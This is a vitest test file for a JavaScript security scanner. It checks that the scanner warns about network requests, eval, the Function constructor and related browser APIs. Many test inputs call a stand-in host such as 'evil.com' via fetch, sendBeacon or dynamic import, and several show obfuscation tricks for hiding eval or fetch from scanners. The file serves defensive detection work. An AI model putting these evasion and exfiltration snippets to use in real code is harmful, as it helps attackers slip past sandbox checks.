import { describe, it, expect } from 'vitest';
import { analyzeCode } from '../security';

const messages = (code: string) => analyzeCode(code).map((f) => f.message);

const FETCH = 'This code makes network requests (fetch)';
const EVAL = 'This code uses dynamic eval()';
const FUNCTION = 'This code uses the Function constructor';
const COMPUTED = 'This code reaches browser features by a computed name (such as self[name])';
const IMPORT = 'This code imports external scripts';
const NAVIGATE = 'This code may navigate the page';
const OPEN = 'This code may open new windows';

describe('analyzeCode (#95)', () => {
  // ── Safe code returns no flags ──

  it('returns empty for ordinary programs', () => {
    expect(analyzeCode('let x = 1;\nconsole.log(x);')).toEqual([]);
    expect(analyzeCode('function fib(n) { return n < 2 ? n : fib(n - 1) + fib(n - 2); }\nconsole.log(fib(10));')).toEqual([]);
    expect(analyzeCode('class Stack { push(x) { this.items.push(x); } }\nnew Stack().push(1);')).toEqual([]);
  });

  // ── The old patterns are still flagged ──

  it('flags each API the old scan flagged, with its message', () => {
    const cases: [string, string][] = [
      ['fetch("https://example.com")', FETCH],
      ['new XMLHttpRequest()', 'This code uses XMLHttpRequest'],
      ['new WebSocket("ws://localhost")', 'This code opens WebSocket connections'],
      ['let c = document.cookie;', 'This code accesses cookies'],
      ['localStorage.setItem("key", "val")', 'This code accesses localStorage'],
      ['sessionStorage.getItem("key")', 'This code accesses sessionStorage'],
      ['eval("alert(1)")', EVAL],
      ['new Function("return 1")', FUNCTION],
      ['location.href = "http://evil.com"', NAVIGATE],
      ['location.replace("http://evil.com")', NAVIGATE],
      ['location.assign("http://evil.com")', NAVIGATE],
      ['window.open("http://example.com")', OPEN],
      ['importScripts("http://evil.com/script.js")', IMPORT],
    ];
    for (const [code, message] of cases) {
      const flags = analyzeCode(code);
      expect(flags, code).toEqual([{ level: 'warning', message }]);
    }
  });

  // ── What the old scan missed ──

  it('flags a computed name on the global object', () => {
    expect(messages('self["fet" + "ch"]("https://evil.com")')).toEqual([COMPUTED]);
    expect(messages('const name = "fetch";\nglobalThis[name]("https://evil.com");')).toEqual([COMPUTED]);
    expect(messages('window[`${"ev"}al`]("1")')).toEqual([COMPUTED]);
  });

  it('sees through the global object when the name is spelled out', () => {
    expect(messages('self["fetch"]("https://evil.com")')).toEqual([FETCH]);
    expect(messages('globalThis.eval("1")')).toEqual([EVAL]);
    expect(messages('window.eval("1")')).toEqual([EVAL]);
    expect(messages('self.self.localStorage.clear()')).toEqual(['This code accesses localStorage']);
    expect(messages('self["console"].log(1)')).toEqual([]);
  });

  it('flags navigator.sendBeacon', () => {
    expect(messages('navigator.sendBeacon("https://evil.com", "data")')).toEqual(['This code sends data with navigator.sendBeacon']);
    expect(messages('self.navigator["sendBeacon"]("https://evil.com", "data")')).toEqual(['This code sends data with navigator.sendBeacon']);
  });

  it('flags dynamic import()', () => {
    expect(messages('import("https://evil.com/module.js").then((m) => m.run());')).toEqual([IMPORT]);
  });

  it('flags Function without new, and the ways around its name', () => {
    expect(messages('Function("return this")()')).toEqual([FUNCTION]);
    expect(messages('[].constructor.constructor("return this")()')).toEqual([FUNCTION]);
    expect(messages('[]["constructor"]["constructor"]("return this")()')).toEqual([FUNCTION]);
    expect(messages('Function.prototype.constructor("return this")()')).toEqual([FUNCTION]);
    expect(messages('const F = Function;\nnew F("return 1");')).toEqual([FUNCTION]);
  });

  it('does not flag Function where it only compares or reads the prototype', () => {
    expect(analyzeCode('const f = () => 1;\nconsole.log(f instanceof Function);')).toEqual([]);
    expect(analyzeCode('const f = () => 1;\nconsole.log(Function.prototype.toString.call(f));')).toEqual([]);
  });

  it('flags indexedDB, EventSource and workers', () => {
    expect(messages('const req = indexedDB.open("db", 1);')).toEqual(['This code accesses IndexedDB storage']);
    expect(messages('const es = new EventSource("https://evil.com/stream");')).toEqual(['This code opens a server connection (EventSource)']);
    expect(messages('const w = new Worker("worker.js");')).toEqual(['This code starts web workers']);
    expect(messages('const w = new SharedWorker("worker.js");')).toEqual(['This code starts web workers']);
  });

  it('flags a bare open() call and assigning location', () => {
    expect(messages('open("https://example.com")')).toEqual([OPEN]);
    expect(messages('location = "https://evil.com";')).toEqual([NAVIGATE]);
    expect(messages('window.location = "https://evil.com";')).toEqual([NAVIGATE]);
    expect(messages('document.location.href = "https://evil.com";')).toEqual([NAVIGATE]);
  });

  it('flags a use of an API that is not a call', () => {
    expect(messages('const get = fetch;\nget("https://evil.com");')).toEqual([FETCH]);
    expect(messages('const run = eval;\nrun("1");')).toEqual([EVAL]);
    expect(messages('(0, eval)("1")')).toEqual([EVAL]);
  });

  // ── What the old scan flagged although harmless ──

  it("does not flag the program's own fetch mock and its calls", () => {
    const code = [
      'function fetch(url) {',
      '  return Promise.resolve({ json: () => ({ url }) });',
      '}',
      'async function load(url) {',
      '  const res = await fetch(url);',
      '  return res.json();',
      '}',
      'load("/users").then(console.log);',
    ].join('\n');
    expect(analyzeCode(code)).toEqual([]);
  });

  it('does not flag local declarations of the same names', () => {
    expect(analyzeCode('const fetch = (url) => url;\nfetch("/a");')).toEqual([]);
    expect(analyzeCode('function get(fetch) { return fetch("/a"); }')).toEqual([]);
    expect(analyzeCode('function get() { var open = () => 1; if (true) { open(); } }')).toEqual([]);
    expect(analyzeCode('class Worker {}\nnew Worker();')).toEqual([]);
    expect(analyzeCode('try { f(); } catch (eval) { console.log(eval); }')).toEqual([]);
    expect(analyzeCode('for (const localStorage of [1, 2]) console.log(localStorage);')).toEqual([]);
    expect(analyzeCode('const { fetch } = { fetch: () => 1 };\nfetch();')).toEqual([]);
    expect(analyzeCode('const self = { data: {} };\nconst key = "a";\nconsole.log(self[key]);')).toEqual([]);
  });

  it('does not flag members and keys that share a name with an API', () => {
    expect(analyzeCode('const api = { fetch(url) { return url; } };\napi.fetch("/a");')).toEqual([]);
    expect(analyzeCode('class Door { open() {} }\nnew Door().open();')).toEqual([]);
    expect(analyzeCode('const page = { location: { href: "" } };\npage.location.href = "/x";')).toEqual([]);
    expect(analyzeCode('const o = { eval: 1, localStorage: 2 };\nconsole.log(o.eval, o.localStorage);')).toEqual([]);
  });

  it('flags a global used outside the scope that declares the same name', () => {
    expect(messages('function mock() { function fetch() {} return fetch(); }\nfetch("/a");')).toEqual([FETCH]);
    expect(messages('{ let fetch = () => 1; }\nfetch("/a");')).toEqual([FETCH]);
  });

  it('ignores comments and strings', () => {
    expect(analyzeCode('// localStorage.clear()\nlet x = 1;')).toEqual([]);
    expect(analyzeCode('/* fetch("https://evil.com") */\nlet x = 1;')).toEqual([]);
    expect(analyzeCode('console.log("eval(1)");')).toEqual([]);
    expect(analyzeCode('const s = `new Function("x")`;\nconsole.log(s);')).toEqual([]);
  });

  // ── Flags ──

  it('gives one flag per kind of finding', () => {
    expect(messages('fetch("a"); fetch("b"); self.fetch("c");')).toEqual([FETCH]);
    expect(messages('eval("1"); window.eval("2"); fetch("url");')).toEqual([FETCH, EVAL]);
    expect(messages('importScripts("a.js"); import("b.js");')).toEqual([IMPORT]);
  });

  it('all flags have warning level', () => {
    for (const flag of analyzeCode('fetch("a"); eval("b"); new Worker("c"); navigator.sendBeacon("d");')) {
      expect(flag.level).toBe('warning');
    }
  });

  // ── A program that doesn't parse ──

  it('falls back to scanning the text when the program does not parse', () => {
    expect(messages('fetch("https://evil.com"\nlet x = ;')).toEqual([FETCH]);
    expect(messages('let = ;\nnavigator.sendBeacon("u", d)')).toEqual(['This code sends data with navigator.sendBeacon']);
    expect(messages('let = ;\nself["fet" + "ch"]("u")')).toEqual([COMPUTED]);
    expect(messages('let = ;\nFunction("return this")()')).toEqual([FUNCTION]);
    expect(messages('let = ;\nimport("https://evil.com/m.js")')).toEqual([IMPORT]);
    expect(messages('let = ;\nlet y = 1;')).toEqual([]);
  });
});
